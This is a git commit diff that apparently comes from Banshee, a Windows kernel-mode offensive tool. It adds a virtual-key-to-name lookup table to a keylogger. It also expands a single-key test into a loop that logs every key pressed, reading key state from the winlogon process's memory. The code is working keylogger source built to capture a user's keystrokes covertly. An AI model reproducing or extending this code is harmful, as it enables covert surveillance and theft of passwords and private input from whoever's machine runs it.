ba6940a22c0a7f2ae3c2b7a97940c3dac06a00d8
eversinc33 <svrath@web.de>
2024-03-16 12:53:49 +0000

    add VK parsing to keylogger

--- Banshee/Keylogger.hpp
+++ Banshee/Keylogger.hpp
@@ -23,11 +23,326 @@
                                                               ((ks)[GET_KS_BYTE(vk)] | GET_KS_LOCK_BIT(vk)) : \
                                                               ((ks)[GET_KS_BYTE(vk)] & ~GET_KS_LOCK_BIT(vk)))
 
-#define VK_A 0x41
+#include "VK.hpp"
 
 UINT8 keyStateMap[64] = { 0 };
 UINT8 keyPreviousStateMap[64] = { 0 };
 UINT8 keyRecentStateMap[64] = { 0 };
+
+const char* BeVkToChar(UINT8 vk)
+{
+    switch (vk)
+    {
+    case VK_KEY_A:
+        return "A";
+    case VK_KEY_B:
+        return "B";
+    case VK_KEY_C:
+        return "C";
+    case VK_KEY_D:
+        return "D";
+    case VK_KEY_E:
+        return "E";
+    case VK_KEY_F:
+        return "F";
+    case VK_KEY_G:
+        return "G";
+    case VK_KEY_H:
+        return "H";
+    case VK_KEY_I:
+        return "I";
+    case VK_KEY_J:
+        return "J";
+    case VK_KEY_K:
+        return "K";
+    case VK_KEY_L:
+        return "L";
+    case VK_KEY_M:
+        return "M";
+    case VK_KEY_N:
+        return "N";
+    case VK_KEY_O:
+        return "O";
+    case VK_KEY_P:
+        return "P";
+    case VK_KEY_Q:
+        return "Q";
+    case VK_KEY_R:
+        return "R";
+    case VK_KEY_S:
+        return "S";
+    case VK_KEY_T:
+        return "T";
+    case VK_KEY_U:
+        return "U";
+    case VK_KEY_V:
+        return "V";
+    case VK_KEY_W:
+        return "W";
+    case VK_KEY_X:
+        return "X";
+    case VK_KEY_Y:
+        return "Y";
+    case VK_KEY_Z:
+        return "Z";
+    case VK_KEY_0:
+        return "0";
+    case VK_KEY_1:
+        return "1";
+    case VK_KEY_2:
+        return "2";
+    case VK_KEY_3:
+        return "3";
+    case VK_KEY_4:
+        return "4";
+    case VK_KEY_5:
+        return "5";
+    case VK_KEY_6:
+        return "6";
+    case VK_KEY_7:
+        return "7";
+    case VK_KEY_8:
+        return "8";
+    case VK_KEY_9:
+        return "9";
+    case VK_LBUTTON:
+        return "LEFT MOUSE BUTTON";
+    case VK_RBUTTON:
+        return "RIGHT MOUSE BUTTON";
+    case VK_CANCEL:
+        return "CANCEL";
+    case VK_MBUTTON:
+        return "MIDDLE MOUSE BUTTON";
+    case VK_XBUTTON1:
+        return "X1 MOUSE BUTTON";
+    case VK_XBUTTON2:
+        return "X2 MOUSE BUTTON";
+    case VK_BACK:
+        return "BACKSPACE";
+    case VK_TAB:
+        return "TAB";
+    case VK_CLEAR:
+        return "CLEAR";
+    case VK_RETURN:
+        return "ENTER";
+    case VK_SHIFT:
+        return "SHIFT";
+    case VK_CONTROL:
+        return "CONTROL";
+    case VK_MENU:
+        return "ALT";
+    case VK_PAUSE:
+        return "PAUSE";
+    case VK_CAPITAL:
+        return "CAPS LOCK";
+    case VK_ESCAPE:
+        return "ESCAPE";
+    case VK_SPACE:
+        return "SPACEBAR";
+    case VK_PRIOR:
+        return "PAGE UP";
+    case VK_NEXT:
+        return "PAGE DOWN";
+    case VK_END:
+        return "END";
+    case VK_HOME:
+        return "HOME";
+    case VK_LEFT:
+        return "LEFT ARROW";
+    case VK_UP:
+        return "UP ARROW";
+    case VK_RIGHT:
+        return "RIGHT ARROW";
+    case VK_DOWN:
+        return "DOWN ARROW";
+    case VK_SELECT:
+        return "SELECT";
+    case VK_PRINT:
+        return "PRINT";
+    case VK_EXECUTE:
+        return "EXECUTE";
+    case VK_SNAPSHOT:
+        return "PRINT SCREEN";
+    case VK_INSERT:
+        return "INSERT";
+    case VK_DELETE:
+        return "DELETE";
+    case VK_HELP:
+        return "HELP";
+    case VK_LWIN:
+        return "LEFT WINDOWS";
+    case VK_RWIN:
+        return "RIGHT WINDOWS";
+    case VK_APPS:
+        return "APPLICATIONS";
+    case VK_SLEEP:
+        return "SLEEP";
+    case VK_NUMPAD0:
+        return "NUMPAD 0";
+    case VK_NUMPAD1:
+        return "NUMPAD 1";
+    case VK_NUMPAD2:
+        return "NUMPAD 2";
+    case VK_NUMPAD3:
+        return "NUMPAD 3";
+    case VK_NUMPAD4:
+        return "NUMPAD 4";
+    case VK_NUMPAD5:
+        return "NUMPAD 5";
+    case VK_NUMPAD6:
+        return "NUMPAD 6";
+    case VK_NUMPAD7:
+        return "NUMPAD 7";
+    case VK_NUMPAD8:
+        return "NUMPAD 8";
+    case VK_NUMPAD9:
+        return "NUMPAD 9";
+    case VK_MULTIPLY:
+        return "NUMPAD *";
+    case VK_ADD:
+        return "NUMPAD +";
+    case VK_SEPARATOR:
+        return "SEPARATOR";
+    case VK_SUBTRACT:
+        return "NUMPAD -";
+    case VK_DECIMAL:
+        return "NUMPAD .";
+    case VK_DIVIDE:
+        return "NUMPAD /";
+    case VK_F1:
+        return "F1";
+    case VK_F2:
+        return "F2";
+    case VK_F3:
+        return "F3";
+    case VK_F4:
+        return "F4";
+    case VK_F5:
+        return "F5";
+    case VK_F6:
+        return "F6";
+    case VK_F7:
+        return "F7";
+    case VK_F8:
+        return "F8";
+    case VK_F9:
+        return "F9";
+    case VK_F10:
+        return "F10";
+    case VK_F11:
+        return "F11";
+    case VK_F12:
+        return "F12";
+    case VK_F13:
+        return "F13";
+    case VK_F14:
+        return "F14";
+    case VK_F15:
+        return "F15";
+    case VK_F16:
+        return "F16";
+    case VK_F17:
+        return "F17";
+    case VK_F18:
+        return "F18";
+    case VK_F19:
+        return "F19";
+    case VK_F20:
+        return "F20";
+    case VK_F21:
+        return "F21";
+    case VK_F22:
+        return "F22";
+    case VK_F23:
+        return "F23";
+    case VK_F24:
+        return "F24";
+    case VK_NUMLOCK:
+        return "NUM LOCK";
+    case VK_SCROLL:
+        return "SCROLL LOCK";
+    case VK_BROWSER_BACK:
+        return "BROWSER BACK";
+    case VK_BROWSER_FORWARD:
+        return "BROWSER FORWARD";
+    case VK_BROWSER_REFRESH:
+        return "BROWSER REFRESH";
+    case VK_BROWSER_STOP:
+        return "BROWSER STOP";
+    case VK_BROWSER_SEARCH:
+        return "BROWSER SEARCH";
+    case VK_BROWSER_FAVORITES:
+        return "BROWSER FAVORITES";
+    case VK_BROWSER_HOME:
+        return "BROWSER HOME";
+    case VK_VOLUME_MUTE:
+        return "VOLUME MUTE";
+    case VK_VOLUME_DOWN:
+        return "VOLUME DOWN";
+    case VK_VOLUME_UP:
+        return "VOLUME UP";
+    case VK_MEDIA_NEXT_TRACK:
+        return "MEDIA NEXT TRACK";
+    case VK_MEDIA_PREV_TRACK:
+        return "MEDIA PREVIOUS TRACK";
+    case VK_MEDIA_STOP:
+        return "MEDIA STOP";
+    case VK_MEDIA_PLAY_PAUSE:
+        return "MEDIA PLAY/PAUSE";
+    case VK_LAUNCH_MAIL:
+        return "LAUNCH MAIL";
+    case VK_MEDIA_SELECT:
+        return "MEDIA SELECT";
+    case VK_LAUNCH_APP1:
+        return "LAUNCH APPLICATION 1";
+    case VK_LAUNCH_APP2:
+        return "LAUNCH APPLICATION 2";
+    case VK_OEM_1:
+        return "OEM 1";
+    case VK_OEM_PLUS:
+        return "OEM +";
+    case VK_OEM_COMMA:
+        return "OEM ,";
+    case VK_OEM_MINUS:
+        return "OEM -";
+    case VK_OEM_PERIOD:
+        return "OEM .";
+    case VK_OEM_2:
+        return "OEM 2";
+    case VK_OEM_3:
+        return "OEM 3";
+    case VK_OEM_4:
+        return "OEM 4";
+    case VK_OEM_5:
+        return "OEM 5";
+    case VK_OEM_6:
+        return "OEM 6";
+    case VK_OEM_7:
+        return "OEM 7";
+    case VK_OEM_8:
+        return "OEM 8";
+    case VK_OEM_102:
+        return "OEM 102";
+    case VK_PROCESSKEY:
+        return "IME PROCESS";
+    case VK_PACKET:
+        return "PACKET";
+    case VK_ATTN:
+        return "ATTN";
+    case VK_CRSEL:
+        return "CRSEL";
+    case VK_EXSEL:
+        return "EXSEL";
+    case VK_EREOF:
+        return "EREOF";
+    case VK_PLAY:
+        return "PLAY";
+    case VK_ZOOM:
+        return "ZOOM";
+    default:
+        return "UNKNOWN";
+    }
+}
 
 /**
  * Read the contents of gafAsyncKeyStateAddr into keyStateMap. 
@@ -142,10 +457,13 @@ BeKeyLoggerFunction(IN PVOID StartContext)
 			BeUpdateKeyStateMap(BeGlobals::winLogonPid, gasAsyncKeyStateAddr);
 
 			// POC: just check for A. TODO: log all keys
-			if (BeWasKeyPressed(0x41))
-			{
-				LOG_MSG("A pressed\n");
-			}
+            for (int i = 0; i < 256; ++i)
+            {
+                if (BeWasKeyPressed(i))
+                {
+                    LOG_MSG("%s pressed\n", BeVkToChar(i));
+                }
+            }
 		}
 		
 		if (BeGlobals::shutdown)
